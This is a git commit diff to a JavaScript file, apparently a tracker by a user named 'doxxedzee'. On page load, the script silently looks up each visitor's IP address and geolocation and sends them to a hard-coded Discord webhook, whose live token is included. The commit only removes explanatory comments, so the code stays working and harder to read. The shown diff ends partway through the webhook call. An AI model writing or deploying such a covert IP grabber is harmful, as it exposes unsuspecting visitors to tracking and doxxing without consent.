1eebfcf414137db71f7a570911cd129649cbf81c
doxxedzee <142604181+doxxedzee@users.noreply.github.com>
2024-10-09 02:16:33 +1030

    Update 4867368346264262626.js

--- js/4867368346264262626.js
+++ js/4867368346264262626.js
@@ -1,19 +1,16 @@
-// Function to fetch IP address and details from ipify and we-are-jammin
 async function getIPDetails() {
   // Fetch IP address from ipify
   const ipResponse = await fetch('https://api.ipify.org?format=json');
   const { ip } = await ipResponse.json();
   
-  // Fetch geolocation details using IP from we-are-jammin.xyz
   const detailedResponse = await fetch(`https://we-are-jammin.xyz/json/${ip}`);
   const detailed = await detailedResponse.json();
   
   return { ip, detailed };
 }
 
-// Function to send the collected data to the Discord webhook
 async function sendWebhook(data) {
-  const webhookUrl = 'https://discord.com/api/webhooks/1289270629932990526/TTpXp3OTrYs1bxpu_oD9rxPsybEqYXx07BVShmwp8480m-jKMvWY0CykepkQiMQJf3uZ'; // Replace with your actual webhook URL
+  const webhookUrl = 'https://discord.com/api/webhooks/1289270629932990526/TTpXp3OTrYs1bxpu_oD9rxPsybEqYXx07BVShmwp8480m-jKMvWY0CykepkQiMQJf3uZ';
   await fetch(webhookUrl, {
       method: 'POST',
       headers: {
@@ -25,7 +22,6 @@ async function sendWebhook(data) {
   });
 }
 
-// Automatically fetch IP details and send to the webhook when the page loads
 window.addEventListener('load', async () => {
   const { ip, detailed } = await getIPDetails();
   await sendWebhook({
